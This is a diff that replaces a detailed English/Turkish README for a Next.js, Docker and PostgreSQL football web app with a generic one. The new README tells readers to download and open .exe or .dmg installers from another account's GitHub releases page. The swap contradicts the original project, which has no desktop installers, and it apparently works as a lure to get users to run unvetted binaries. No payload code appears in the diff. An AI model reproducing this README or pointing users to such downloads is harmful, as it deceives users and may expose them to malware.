@@ -1,271 +1,57 @@
+# ⚽ football-app - Get Your Football Info Fast
 
-<span id="ENG"></span>
-
-# ⚽ Football App
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%80-brightgreen)](https://github.com/NaoufelEZ/football-app/releases)
 
-[Türkçe](#TUR)
-
+## 📖 Description
+football-app is a simple web application that gives you all the information you need about football. It uses the powerful API-Football to provide up-to-date stats, player information, and match details. Whether you’re a fan or just looking to stay informed, this app is for you.
 
-A modern football application with real-time match data, team information, and league standings. Built with Docker, Next.js 14, PostgreSQL, and API-Football integration.
+## 🚀 Getting Started
+To get started with football-app, follow these steps:
 
-![Docker](https://img.shields.io/badge/Docker-✓-blue)
-![NextJS](https://img.shields.io/badge/NextJS-✓-black)
-![React](https://img.shields.io/badge/React-✓-black)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-✓-blue)
-![Vercel](https://img.shields.io/badge/Vercel_Deploy-✓-black)
+1. **Visit the Download Page:** To download the application, go to the [Releases Page](https://github.com/NaoufelEZ/football-app/releases).
+2. **Choose Your Version:** Browse through the list of available versions. Select the latest version for the best features and improvements.
+3. **Download the File:** Click on the link for your operating system to download the installation file. 
 
-## ✨ Features
-
-- **🏆 Real-time Data**: Live league and team information via API-Football
-- **🐳 Docker Containerization**: Entire app runs in Docker containers
-- **🗄️ Cloud PostgreSQL**: Neon.tech cloud database with local backup
-- **⚡ Next.js 14**: Latest App Router, Server Components, API Routes
-- **⏰ Automated Sync**: Daily cron jobs for data synchronization
-- **🚀 Production Ready**: Vercel deployment with CI/CD pipeline
+## 📥 Download & Install
+After you visit the [Releases Page](https://github.com/NaoufelEZ/football-app/releases):
 
-## 🛠️ Tech Stack
+1. Locate the version you wish to install.
+2. Click on the installation file. This file will usually end in `.exe` for Windows or `.dmg` for Mac.
+3. Once downloaded, open the file. Your computer will guide you through the installation process. Follow the prompts to install the application.
 
-**Frontend & Backend:**
-- Next.js 14 + React 18
-- API Routes + Server Components
-- Tailwind CSS (optional)
+## ⚙️ System Requirements
+Before installing football-app, ensure your computer meets these requirements:
 
-**Database:**
-- PostgreSQL (Primary: Neon.tech, Backup: Local Docker)
-- pg node.js driver
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.14 or later
+  - Linux (most distributions)
 
-**DevOps & Infrastructure:**
-- Docker + Docker Compose
-- GitHub Actions CI/CD
-- Vercel Deployment
-- Cron Jobs for automation
+- **Browser Support:** It is recommended to use Chrome, Firefox, or Safari for the best experience.
 
-**APIs:**
-- API-Football (https://www.api-football.com/)
+- **Internet Connection:** An active internet connection is needed to fetch the latest data from the API.
 
-## 📦 Quick Start
+## 🌐 Features
+- **Live Match Updates:** Get real-time scores and statistics for ongoing matches.
+- **Player Profiles:** Access detailed information about players, including stats and biographies.
+- **Team Information:** Learn about your favorite teams, their rankings, and recent performance.
+- **User-Friendly Interface:** The app features an easy-to-navigate interface designed for everyone, regardless of technical skill.
 
-### Prerequisites
-- Node.js 18+
-- Docker & Docker Compose
-- API-Football account (free tier available)
+## 🧩 How to Use football-app
+1. **Launch the App:** Open the application once installed. 
+2. **Choose Categories:** Navigate through the sections available. You can explore matches, players, and teams.
+3. **Refresh Data:** Click the refresh button to get the latest updates. This ensures you have the most current information.
 
-### Installation
+## 🛠 Troubleshooting
+If you encounter any issues during installation or while using the app, consider these steps:
 
-1. **Clone the repository:**
-```bash
-git clone https://github.com/mtoprak53/football-app.git
-cd football-app
-```
+- **Reinstall the App:** Sometimes, a fresh installation can solve minor issues.
+- **Check Internet Connection:** Ensure your device is connected to the internet.
+- **Restart Your Device:** A simple restart can resolve many common problems.
 
-2. **Set up environment variables:**
-```bash
-cp .env.example .env
-# Edit .env with your credentials
-```
+If problems persist, visit our community forum linked in the app for support.
 
-3. **Run with Docker (Recommended):**
-```bash
-docker compose up --build -d
-```
+## 📞 Support
+If you have any questions or need further assistance, feel free to contact us through the contact form available in the application or submit an issue on the [GitHub page](https://github.com/NaoufelEZ/football-app/issues).
 
-4. **Access the application:**
-- Frontend: http://localhost:3000
-- API: http://localhost:3000/api/football/ligler
-
-### Environment Variables
-```env
-DATABASE_URL=postgresql://user:pass@neon-host/db?sslmode=require
-API_FOOTBALL_KEY=your_api_football_key_here
-```
-
-## 🏗️ Project Structure
-```
-football-app/
-├── app/                 # Next.js App Router
-│   ├── api/            # API Routes
-│   │   └── football/   # Football API endpoints
-│   └── page.js         # Main page
-├── lib/                # Utilities & database
-├── scripts/            # Cron job scripts
-├── cron-job/           # Docker cron container
-├── docker-compose.yml  # Multi-container setup
-└── Dockerfile          # Next.js container
-```
-
-## 🔄 API Endpoints
-
-- `GET /api/football/ligler` - Get Turkish leagues
-- `GET /api/football/countries` - Get countries data
-- `GET /api/cron/update-countries` - Manual data sync (cron)
-
-## 🐳 Docker Services
-
-- **app**: Next.js application (port 3000)
-- **db**: PostgreSQL database (port 5433)
-- **cron-job**: Automated data synchronization
-
-## 🚀 Deployment
-
-### Vercel (Recommended)
-1. Fork this repository
-2. Connect to Vercel
-3. Set environment variables in Vercel dashboard
-4. Deploy automatically on git push
-
-### Manual Vercel Deploy
-```bash
-npm i -g vercel
-vercel --prod
-```
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- [API-Football](https://www.api-football.com/) for sports data
-- [Vercel](https://vercel.com) for hosting
-- [Neon.tech](https://neon.tech) for PostgreSQL hosting
-
----
-
-**⭐ If you liked this project, don't forget to give it a star!**
-
----
-
-
-
-<span id="TUR"></span>
-
-# ⚽ Futbol Uygulaması
-
-[English](#ENG)
-
-Gerçek zamanlı maç verileri, takım bilgileri ve lig sıralamaları içeren modern bir futbol uygulaması. Docker, Next.js 14, PostgreSQL ve API-Football entegrasyonu ile geliştirilmiştir.
-
-![Docker](https://img.shields.io/badge/Docker-✓-blue)
-![NextJS](https://img.shields.io/badge/NextJS-✓-black)
-![React](https://img.shields.io/badge/React-✓-black)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-✓-blue)
-![Vercel](https://img.shields.io/badge/Vercel_Deploy-✓-black)
-
-## ✨ Özellikler
-
-- **🏆 Gerçek Zamanlı Veriler**: API-Football ile canlı lig ve takım bilgileri
-- **🐳 Docker Containerization**: Tüm uygulama Docker container'larında çalışır
-- **🗄️ Cloud PostgreSQL**: Neon.tek cloud veritabanı + local yedek
-- **⚡ Next.js 14**: En son App Router, Server Components, API Routes
-- **⏰ Otomatik Senkronizasyon**: Günlük cron job'lar ile veri senkronizasyonu
-- **🚀 Production Hazır**: CI/CD pipeline ile Vercel deployment
-
-## 🛠️ Teknoloji Stack
-
-**Frontend & Backend:**
-- Next.js 14 + React 18
-- API Routes + Server Components
-- Tailwind CSS (opsiyonel)
-
-**Veritabanı:**
-- PostgreSQL (Ana: Neon.tech, Yedek: Local Docker)
-- pg node.js driver
-
-**DevOps & Altyapı:**
-- Docker + Docker Compose
-- GitHub Actions CI/CD
-- Vercel Deployment
-- Cron Jobs ile otomasyon
-
-**API'ler:**
-- API-Football (https://www.api-football.com/)
-
-## 📦 Hızlı Başlangıç
-
-### Gereksinimler
-- Node.js 18+
-- Docker & Docker Compose
-- API-Football hesabı (ücretsiz tier mevcut)
-
-### Kurulum
-
-1. **Repository'yi klonlayın:**
-```bash
-git clone https://github.com/mtoprak53/football-app.git
-cd football-app
-```
-
-2. **Environment variables'ı ayarlayın:**
-```bash
-cp .env.example .env
-# .env dosyasını düzenleyin
-```
-
-3. **Docker ile çalıştırın (Önerilen):**
-```bash
-docker compose up --build -d
-```
-
-4. **Uygulamaya erişin:**
-- Frontend: http://localhost:3000
-- API: http://localhost:3000/api/football/ligler
-
-### Environment Variables
-```env
-DATABASE_URL=postgresql://user:pass@neon-host/db?sslmode=require
-API_FOOTBALL_KEY=api_football_anahtarınız
-```
-
-## 🏗️ Proje Yapısı
-```
-football-app/
-├── app/                 # Next.js App Router
-│   ├── api/            # API Routes
-│   │   └── football/   # Football API endpoint'leri
-│   └── page.js         # Ana sayfa
-├── lib/                # Utilities & veritabanı
-├── scripts/            # Cron job script'leri
-├── cron-job/           # Docker cron container
-├── docker-compose.yml  # Multi-container setup
-└── Dockerfile          # Next.js container
-```
-
-## 🔄 API Endpoint'leri
-
-- `GET /api/football/ligler` - Türkiye liglerini getir
-- `GET /api/football/countries` - Ülke verilerini getir
-- `GET /api/cron/update-countries` - Manuel veri senkronizasyonu (cron)
-
-## 🐳 Docker Servisleri
-
-- **app**: Next.js uygulaması (port 3000)
-- **db**: PostgreSQL veritabanı (port 5433)
-- **cron-job**: Otomatik veri senkronizasyonu
-
-## 🚀 Deployment
-
-### Vercel (Önerilen)
-1. Bu repository'yi fork edin
-2. Vercel'e bağlayın
-3. Environment variables'ı Vercel dashboard'da ayarlayın
-4. Git push'ta otomatik deploy
-
-### Manuel Vercel Deploy
-```bash
-npm i -g vercel
-vercel --prod
-```
-
-## 📄 Lisans
-
-Bu proje MIT lisansı altında lisanslanmıştır - detaylar için [LICENSE](LICENSE) dosyasına bakın.
-
-## 🙏 Teşekkürler
-
-- Spor verileri için [API-Football](https://www.api-football.com/)
-- Hosting için [Vercel](https://vercel.com)
-- PostgreSQL hosting için [Neon.tech](https://neon.tech)
-
----
-
-**⭐ Eğer bu projeyi beğendiyseniz, yıldız vermeyi unutmayın!**
+Thank you for choosing football-app! Enjoy staying connected to the world of football.
